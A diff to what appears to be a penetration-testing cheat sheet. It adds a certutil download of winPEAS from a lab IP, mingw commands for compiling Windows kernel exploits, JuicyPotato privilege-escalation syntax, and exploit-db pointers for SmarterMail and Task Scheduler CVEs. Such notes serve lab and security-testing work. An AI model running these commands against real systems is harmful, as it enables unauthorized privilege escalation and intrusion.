@@ -299,6 +299,9 @@ Convert file into clipboard contents
 	[IO.File]::WriteAllBytes("C:\filename", [Convert]::FromBase64String("base64string"))
 Write clipboard into file  
 
+	certutil -urlcache -f http://10.10.10.10/winPEAS.bat winpeas.bat
+If no curl or powershell  
+
 ## Windows - directory
 	tree /f
 .  
@@ -327,6 +330,26 @@ Search for any file with .kdbx extension
 .  
 
 	tasklist /svc
+
+## Windows - kernel exploits
+[Precompiled binaries](https://github.com/SecWiki/windows-kernel-exploits)  
+
+To compile, use `mingw-w64`  
+
+	x86_64-w64-mingw32-gcc -o output.exe source.c
+64 bit compilation, C code  
+
+	i686-w64-mingw32-gcc -o output32.exe source.c
+32 bit compilation, C code  
+
+	x86_64-w64-mingw32-gcc -shared -o output.dll source.c
+64 bit compilation, DLL file  
+
+	x86_64-w64-mingw32-gcc -o exploit.exe exploit.c -lws2_32
+Compilation with winsock  
+
+	x86_64-w64-mingw32-g++ -o app.exe app.cpp
+Compilation for C++  
 
 ## Windows - services
 	sc \\localhost query state= all| findstr SERVICE_NAME
@@ -380,8 +403,9 @@ Transfer some kind of Potato to target machine
 	./SigmaPotato.exe whoami
 Win8 - Win11/2012/2016/2019/2022  
 
-	./juicypotato.exe -l <port> -p cmd -t *
+	./juicypotato.exe -l <port> -p cmd -t * -c {CLSID}
 Win7 - Win10/2008R2/2012/2016  
+Check CLSIDs [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID)  
 
 	./printspoofer.exe -i -c cmd
 Win10/2016/2019  
@@ -761,6 +785,8 @@ GET/POST parameters
 |wp-advanced-search|<3.3.9.2|CVE-2024-9796|[wpscan](https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/)|Use PoC SQL injection|
 |PyLoad|0.5.0|CVE-2023-0297|[exploitdb](https://www.exploit-db.com/exploits/51532)|First check if `/flash/addcrypted2` endpoint is available|
 |PHP SPX||CVE-2024-42007|[github issue](https://github.com/NoiseByNorthwest/php-spx/issues/251)|Replace SPX_KEY with server SPX key|
+|SmarterMail|6985|CVE-2019-7214|[exploitdb](https://www.exploit-db.com/exploits/49216)|.NET remoting service port open|
+|Windows TaskSch||CVE-2010-3338|[exploitdb](https://www.exploit-db.com/exploits/15589)|Run `cscript file.wsf`. New creds created: `test123:test123`|
 
 
 ## Run new shell
@@ -788,3 +814,6 @@ Create virtual env. for custom python packages
 
 	deactivate
 cleanup  
+
+## JuicyPotato 32 bit
+For old [machines](https://github.com/ivanitlearning/Juicy-Potato-x86)  
